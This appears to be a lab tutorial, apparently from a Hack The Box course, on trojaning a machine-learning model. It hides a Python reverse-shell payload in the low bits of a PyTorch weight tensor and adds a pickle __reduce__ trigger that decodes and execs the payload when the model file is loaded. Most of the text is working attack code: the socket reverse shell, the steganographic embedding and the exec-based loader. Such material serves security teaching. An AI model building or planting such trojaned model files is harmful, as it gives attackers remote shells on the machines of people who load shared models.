# The Attack

---

Having established a target model (`state_dict`saved) and developed our steganographic tools (`encode_lsb`,`decode_lsb`), we now move onto the main phase of the attack.

## The Payload

The first step is to define the code we ultimately want to execute on the target's machine. We'll be using a classic a`reverse shell`. It establishes a connection from the target machine back to a listener controlled by us, granting us interactive command-line access.

We must configure the connection parameters within the payload code itself.`HOST_IP`needs to be the IP address of our listener machine, ensuring it's`reachable from the environment where target will load the model`.`LISTENER_PORT`specifies the corresponding port our listener will monitor.

Code:python```
`importsocket,subprocess,os,pty,sys,traceback# Imports needed by payload# Configure connection details for the reverse shell# Use the IP/DNS name of the machine running the listener, accessible FROM your target instance,HOST_IP="localhost"# THIS IS YOUR IP WHEN ON THE HTB NETWORKLISTENER_PORT=4444# The port that you will listen for a connection onprint(f"--- Payload Configuration ---")print(f"Payload will target:{HOST_IP}:{LISTENER_PORT}")print(f"-----------------------------")`
```

The`payload_code_string`itself contains Python code implementing the reverse shell logic. It attempts to connect to the specified attacker IP and port, and upon a successful connection, it redirects standard input, output, and error streams to the socket and spawns a shell (e.g.,`/bin/bash`).

Code:python```
`# The payload string itselfpayload_code_string=f"""
import socket, subprocess, os, pty, sys, traceback
print("[PAYLOAD] Payload starting execution.", file=sys.stderr); sys.stderr.flush()
attacker_ip = '{HOST_IP}'; attacker_port ={LISTENER_PORT}print(f"[PAYLOAD] Attempting connection to {{attacker_ip}}:{{attacker_port}}...", file=sys.stderr); sys.stderr.flush()
s = None
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(5.0)
    s.connect((attacker_ip, attacker_port)); s.settimeout(None)
    print("[PAYLOAD] Connection successful.", file=sys.stderr); sys.stderr.flush()
    print("[PAYLOAD] Redirecting stdio...", file=sys.stderr); sys.stderr.flush()
    os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
    shell = os.environ.get('SHELL', '/bin/bash')
    print(f"[PAYLOAD] Spawning shell: {{shell}}", file=sys.stderr); sys.stderr.flush() # May not be seen
    pty.spawn([shell]) # Start interactive shell
except socket.timeout: print(f"[PAYLOAD] ERROR: Connection timed out.", file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
except ConnectionRefusedError: print(f"[PAYLOAD] ERROR: Connection refused.", file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
except Exception as e: print(f"[PAYLOAD] ERROR: Unexpected error: {{e}}", file=sys.stderr); traceback.print_exc(file=sys.stderr); sys.stderr.flush()
finally:
    print("[PAYLOAD] Payload script finishing.", file=sys.stderr); sys.stderr.flush()
    if s:
        try: s.close()
        except: pass
    os._exit(1) # Force exit
"""`
```

Once the payload string is defined, it's encoded into bytes using UTF-8. This byte representation is what will be hidden using steganography.

Code:python```
`# Encode payload for steganographypayload_bytes_to_hide=payload_code_string.encode("utf-8")print(f"Payload defined and encoded to{len(payload_bytes_to_hide)}bytes.")`
```

## Embedding the Payload

With the payload prepared as`payload_bytes_to_hide`, the next step is to embed it into the parameters of our target model.

Code:python```
`importtorch# Ensure torch is importedimportos# Ensure os is imported for file checksNUM_LSB=2# Number of LSBs to use`
```

We begin by loading the "legitimate"`state_dict`we saved earlier (`legitimate_state_dict_file`) back into memory using`torch.load()`.

Code:python```
`# Load the legitimate state dictlegitimate_state_dict_file="victim_model_state.pth"ifnotos.path.exists(legitimate_state_dict_file):raiseFileNotFoundError(f"Legitimate state dict '{legitimate_state_dict_file}' not found.")print(f"\nLoading legitimate state dict from '{legitimate_state_dict_file}'...")loaded_state_dict=torch.load(legitimate_state_dict_file)# Load the dictionaryprint("State dict loaded successfully.")`
```

We then select the specific tensor within this dictionary that will serve as the carrier for our hidden data. We'll be using`large_layer.weight`(identified by`target_key`). Its substantial size makes it suitable for hiding our payload without excessive modification density. We retrieve this original tensor (`original_target_tensor`).

Code:python```
`# Choose a target layer/tensor for embeddingtarget_key="large_layer.weight"iftarget_keynotinloaded_state_dict:raiseKeyError(f"Target key '{target_key}' not found in state dict. Available keys:{list(loaded_state_dict.keys())}")original_target_tensor=loaded_state_dict[target_key]print(f"Selected target tensor '{target_key}' with shape{original_target_tensor.shape}and{original_target_tensor.numel()}elements.")`
```

We need to ensure we have the capacity within the target tensor to embed the payload, and to do this, we calculate precisely how many elements within the`original_target_tensor`are required to store the`payload_bytes_to_hide`(plus the 4-byte length prefix) using the chosen number of least significant bits (`NUM_LSB`). If the tensor's element count (`numel`) is less than the`elements_needed`, the operation cannot succeed.

Code:python```
`# Ensure the payload isn't too large for the chosen tensorbytes_to_embed=4+len(payload_bytes_to_hide)# 4 bytes for length prefixbits_needed=bytes_to_embed*8elements_needed=(bits_needed+NUM_LSB-1)//NUM_LSB# Ceiling divisionprint(f"Payload requires{elements_needed}elements using{NUM_LSB}LSBs.")iforiginal_target_tensor.numel()<elements_needed:raiseValueError(f"Target tensor '{target_key}' is too small for the payload!")`
```

Provided the capacity is adequate, we invoke our`encode_lsb`function. It takes the`original_target_tensor`, our`payload_bytes_to_hide`, and`NUM_LSB`as input. The function performs the LSB encoding and returns`modified_target_tensor`. This modified tensor is then placed into a copy of the original`state_dict`. This`modified_state_dict`is now compromised, containing payload.

Code:python```
`# Encode the payload into the target tensorprint(f"\nEncoding payload into tensor '{target_key}'...")try:modified_target_tensor=encode_lsb(original_target_tensor,payload_bytes_to_hide,NUM_LSB)print("Encoding complete.")# Replace the original tensor with the modified one in the dictionarymodified_state_dict=(loaded_state_dict.copy())# Don't modify the original loaded dict directlymodified_state_dict[target_key]=modified_target_tensorprint(f"Replaced '{target_key}' in state dict with modified tensor.")exceptExceptionase:print(f"Error during encoding or state dict modification:{e}")raise# Re-raise the exception`
```

## The Trigger

As we know, Python’s arbitrary-code execution vector arises from the way`pickle`calls an object’s`__reduce__`method. We'll define`TrojanModelWrapper`to exploit this vulnerability.

The`__init__`constructor merely stores the altered`state_dict`, the dictionary key that hides the payload (for instance`"large_layer.weight"`), and the least-significant-bit depth used for encoding, values that`__reduce__`will later need.

Code:python```
`importpickleimporttorchimportstructimporttracebackimportosimportptyimportsocketimportsysimportsubprocessclassTrojanModelWrapper:"""
    A malicious wrapper class designed to act as a Trojan.
    """def__init__(self,modified_state_dict:dict,target_key:str,num_lsb:int):"""
        Initializes the wrapper, pickling the state_dict for embedding.
        """print(f"  [Wrapper Init] Received modified state_dict with{len(modified_state_dict)}keys.")print(f"  [Wrapper Init] Received target_key: '{target_key}'")print(f"  [Wrapper Init] Received num_lsb:{num_lsb}")iftarget_keynotinmodified_state_dict:raiseValueError(f"target_key '{target_key}' not found in the provided state_dict.")ifnotisinstance(modified_state_dict[target_key],torch.Tensor):raiseTypeError(f"Value at target_key '{target_key}' is not a Tensor.")ifmodified_state_dict[target_key].dtype!=torch.float32:raiseTypeError(f"Tensor at target_key '{target_key}' is not float32.")ifnot1<=num_lsb<=8:raiseValueError("num_lsb must be between 1 and 8.")try:self.pickled_state_dict_bytes=pickle.dumps(modified_state_dict)print(f"  [Wrapper Init] Successfully pickled state_dict for embedding ({len(self.pickled_state_dict_bytes)}bytes).")exceptExceptionase:print(f"--- Error pickling state_dict ---")print(f"Error:{e}")raiseRuntimeError("Failed to pickle state_dict for embedding in wrapper.")frome

        self.target_key=target_key
        self.num_lsb=num_lsbprint("  [Wrapper Init] Initialization complete. Wrapper is ready to be pickled.")defget_state_dict(self):try:returnpickle.loads(self.pickled_state_dict_bytes)exceptExceptionase:print(f"Error deserializing internal state_dict:{e}")returnNone`
```

The`__reduce__`method is what we are most interested in. Here, we replace ordinary reconstruction instructions with`(exec, (loader_code,))`, telling the unpickler to run a crafted string instead of rebuilding a harmless object. That string is assembled on the fly: it contains the entire pickled`state_dict`, the target key, the LSB parameter, and the source for a small`decode_lsb`helper. When`exec`runs it during deserialization, the code recreates the dictionary, pulls out the tensor at the embedded key, extracts the hidden bytes with`decode_lsb`, converts them back to the original payload (a reverse shell), and executes it.

Because everything: data, parameters, helper function, and trigger, is folded into one contiguous string, the attack travels as a single self-contained file.

Code:python```
`def__reduce__(self):"""
        Exploits pickle deserialization to execute embedded loader code.
        """print("\n[!] TrojanModelWrapper.__reduce__ activated (likely during pickling/saving process)!")print("    Preparing loader code string...")# Embed the decode_lsb function source code.decode_lsb_source="""
import torch, struct, pickle, traceback
def decode_lsb(tensor_modified: torch.Tensor, num_lsb: int) -> bytes:
    if tensor_modified.dtype != torch.float32: raise TypeError("Tensor must be float32.")
    if not 1 <= num_lsb <= 8: raise ValueError("num_lsb must be 1-8.")
    tensor_flat = tensor_modified.flatten(); n_elements = tensor_flat.numel(); element_index = 0
    def get_bits(count: int) -> list[int]:
        nonlocal element_index; bits = []
        while len(bits) < count:
            if element_index >= n_elements: raise ValueError(f"Tensor ended prematurely trying to read {count} bits.")
            current_float = tensor_flat[element_index].item();
            try: packed_float = struct.pack('>f', current_float); int_representation = struct.unpack('>I', packed_float)[0]
            except struct.error: element_index += 1; continue
            mask = (1 << num_lsb) - 1; lsb_data = int_representation & mask
            for i in range(num_lsb):
                bit = (lsb_data >> (num_lsb - 1 - i)) & 1; bits.append(bit)
                if len(bits) == count: break
            element_index += 1
        return bits
    try:
        length_bits = get_bits(32); length_int = 0
        for bit in length_bits: length_int = (length_int << 1) | bit
        payload_len_bytes = length_int
        if payload_len_bytes == 0: return b''
        if payload_len_bytes < 0: raise ValueError(f"Decoded negative length: {payload_len_bytes}")
        payload_bits = get_bits(payload_len_bytes * 8)
        decoded_bytes = bytearray(); current_byte_val = 0; bit_count = 0
        for bit in payload_bits:
            current_byte_val = (current_byte_val << 1) | bit; bit_count += 1
            if bit_count == 8: decoded_bytes.append(current_byte_val); current_byte_val = 0; bit_count = 0
        return bytes(decoded_bytes)
    except ValueError as e: raise ValueError(f"Embedded LSB Decode failed: {e}") from e
    except Exception as e_inner: raise RuntimeError(f"Unexpected Embedded LSB Decode error: {e_inner}") from e_inner
"""# Embed necessary datapickled_state_dict_literal=repr(self.pickled_state_dict_bytes)embedded_target_key=repr(self.target_key)embedded_num_lsb=self.num_lsbprint(f"  [Reduce] Embedding{len(self.pickled_state_dict_bytes)}bytes of pickled state_dict.")# Construct the loader code stringloader_code=f"""
import pickle, torch, struct, traceback, os, pty, socket, sys, subprocess
print('[+] Trojan Wrapper: Loader code execution started.', file=sys.stderr); sys.stderr.flush(){decode_lsb_source}print('[+] Trojan Wrapper: Embedded decode_lsb function defined.', file=sys.stderr); sys.stderr.flush()
pickled_state_dict_bytes ={pickled_state_dict_literal}target_key ={embedded_target_key}num_lsb ={embedded_num_lsb}print(f'[+] Trojan Wrapper: Embedded data retrieved (state_dict size={{len(pickled_state_dict_bytes)}}, target_key={{target_key!r}}, num_lsb={{num_lsb}}).', file=sys.stderr); sys.stderr.flush()
try:
    print('[+] Trojan Wrapper: Deserializing embedded state_dict...', file=sys.stderr); sys.stderr.flush()
    reconstructed_state_dict = pickle.loads(pickled_state_dict_bytes)
    if not isinstance(reconstructed_state_dict, dict):
        raise TypeError("Deserialized object is not a dictionary (state_dict).")
    print(f'[+] Trojan Wrapper: State_dict reconstructed successfully ({{len(reconstructed_state_dict)}} keys).', file=sys.stderr); sys.stderr.flush()
    if target_key not in reconstructed_state_dict:
        raise KeyError(f"Target key '{{target_key}}' not found in reconstructed state_dict.")
    payload_tensor = reconstructed_state_dict[target_key]
    if not isinstance(payload_tensor, torch.Tensor):
         raise TypeError(f"Value for key '{{target_key}}' is not a Tensor.")
    print(f'[+] Trojan Wrapper: Located payload tensor (key={{target_key!r}}, shape={{payload_tensor.shape}}).', file=sys.stderr); sys.stderr.flush()
    print(f'[+] Trojan Wrapper: Decoding hidden payload from tensor using {{num_lsb}} LSBs...', file=sys.stderr); sys.stderr.flush()
    extracted_payload_bytes = decode_lsb(payload_tensor, num_lsb)
    print(f'[+] Trojan Wrapper: Payload decoded successfully ({{len(extracted_payload_bytes)}} bytes).', file=sys.stderr); sys.stderr.flush()
    extracted_payload_code = extracted_payload_bytes.decode('utf-8', errors='replace')
    print('[!] Trojan Wrapper: Executing final decoded payload (reverse shell)...', file=sys.stderr); sys.stderr.flush()
    exec(extracted_payload_code, globals(), locals())
    print('[!] Trojan Wrapper: Payload execution initiated.', file=sys.stderr); sys.stderr.flush()

except Exception as e:
    print(f'[!!!] Trojan Wrapper: FATAL ERROR during loader execution: {{e}}', file=sys.stderr);
    traceback.print_exc(file=sys.stderr); sys.stderr.flush()
finally:
    print('[+] Trojan Wrapper: Loader code sequence finished.', file=sys.stderr); sys.stderr.flush()
"""print("  [Reduce] Loader code string constructed with escaped inner braces.")print("  [Reduce] Returning (exec, (loader_code,)) tuple to pickle.")return(exec,(loader_code,))print("TrojanModelWrapper class defined.")`
```